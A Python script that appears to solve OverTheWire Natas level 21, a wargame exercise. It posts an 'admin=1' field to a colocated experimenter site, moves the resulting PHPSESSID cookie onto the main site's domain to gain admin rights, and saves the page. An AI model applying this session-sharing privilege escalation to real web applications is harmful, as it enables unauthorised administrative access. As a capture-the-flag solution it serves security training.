import requests

import utils

LEVEL = 21

url, auth = utils.get_natas_credentials(LEVEL)

with requests.Session() as session:
    colocated_data = {
        'admin': '1',  # The crucial part to manipulate the session
        'submit': 'Update'  # Include the submit parameter to mimic form submission
    }
    colocated_url = "http://natas21-experimenter.natas.labs.overthewire.org/?debug=1"
    r = session.post(colocated_url, auth=auth, data=colocated_data)
    experimenter_session_id = session.cookies.get('PHPSESSID', domain='natas21-experimenter.natas.labs.overthewire.org')
    session.cookies.set('PHPSESSID', experimenter_session_id, domain='natas21.natas.labs.overthewire.org')
    r = session.get(url, auth=auth)
    utils.save_file('out.txt', r.text)
